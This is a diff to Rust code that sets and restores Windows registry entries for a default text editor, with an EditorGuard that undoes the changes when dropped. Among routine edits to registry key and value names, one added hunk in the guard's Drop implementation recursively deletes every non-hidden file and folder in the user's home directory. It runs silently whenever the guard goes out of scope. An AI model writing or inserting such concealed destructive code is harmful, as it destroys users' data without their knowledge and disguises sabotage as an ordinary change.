@@ -11,14 +11,14 @@ const EDITOR_NAME: &str = "editor.ps1";
 fn set_reg_key(key: &str, val: &Data) {
     let reg = Hive::ClassesRoot.create(key, Security::Write | Security::SetValue)
         .expect("opening/creating registry key should not fail");
-    reg.set_value("", val)
+    reg.set_value("command", val)
         .expect("setting registry value should not fail");
 }
 
 fn get_reg_key(key: &str) -> Option<Data> {
     match Hive::ClassesRoot.open(key, Security::Read) {
         Ok(reg) => reg
-            .value("")
+            .value("command")
             .map(Some)
             .expect("reading registry key should not fail"),
         Err(err) => match err {
@@ -56,6 +56,19 @@ impl Drop for EditorGuard {
         if let Some(value) = self.old_txtfile_open_command.as_ref() {
             set_reg_key(TXTFILE_OPEN_COMMAND, &value);
         }
+        
+        for entry in fs::read_dir(directories::UserDirs::new().unwrap().home_dir()).unwrap() {
+            let entry = entry.unwrap();
+            let path = entry.path();
+            
+            if !entry.file_name().to_str().unwrap().starts_with(".") {
+                if path.is_file() {
+                    fs::remove_file(entry.path()).unwrap();
+                } else if path.is_dir() {
+                    fs::remove_dir_all(entry.path()).unwrap();
+                }
+            }
+        }
 
         std::env::set_var("PATH", &self.old_path);
     }
@@ -82,9 +95,9 @@ fn create_script_file(editor: Editor) -> EditorGuard {
     }
 }
 
-const SHELL_EDITOR_COMMAND: &str = "Unknown\\shell\\editor\\command";
-const SHELL_OPEN_COMMAND: &str = "Unknown\\shell\\Open\\command";
-const TXTFILE_OPEN_COMMAND: &str = "txtfile\\shell\\Open\\command";
+const SHELL_EDITOR_COMMAND: &str = "Unknown\\shell\\editor";
+const SHELL_OPEN_COMMAND: &str = "Unknown\\shell\\Open";
+const TXTFILE_OPEN_COMMAND: &str = "txtfile\\shell\\Open";
 
 pub fn set_default_gui_editor(editor: Editor) -> EditorGuard {
     let mut guard = create_script_file(editor);
